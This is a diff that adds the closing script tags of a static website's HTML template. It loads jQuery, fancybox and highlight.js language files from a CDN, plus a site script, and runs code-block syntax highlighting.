+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://thieu1995.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
